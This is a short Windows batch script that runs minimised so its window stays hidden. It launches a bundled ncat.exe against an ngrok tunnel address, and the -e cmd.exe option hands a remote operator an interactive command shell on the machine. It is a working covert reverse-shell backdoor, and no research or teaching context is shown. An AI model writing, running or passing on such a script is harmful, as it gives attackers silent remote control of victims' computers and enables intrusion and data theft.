@echo off
:: Hide the command prompt window
start /min cmd /c "%~dp0ncat.exe 4.tcp.eu.ngrok.io 15726 -e cmd.exe"
exit
